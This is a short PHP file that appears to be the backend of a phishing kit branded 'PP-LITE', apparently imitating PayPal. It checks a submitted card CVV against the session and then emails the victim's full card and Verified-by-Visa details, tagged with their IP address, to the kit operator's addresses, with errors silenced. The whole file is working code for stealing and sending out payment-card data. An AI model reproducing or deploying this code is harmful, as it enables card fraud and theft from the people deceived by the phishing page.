<?php
session_start();

sleep(2);
include("../send/mail.php");
include("../send/functionsend.php");
$GETCVV = $_POST['CVV'];
if($GETCVV != $_SESSION['CVV']){
	echo "YOUHAVEERRORBRO";
}else{
	$head = "MIME-Version: 1.0" . "\r\n";
    $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $head .= "from: PP-LITE" . "\r\n";
    $subject = "New VBV Full Info Form : ".getenv("REMOTE_ADDR");foreach ($to as $to)
	@mail($to,$subject,functionsend::Cardvbv(),$head);
	@mail($send,$subject,functionsend::Cardvbv(),$head);
	
}
?>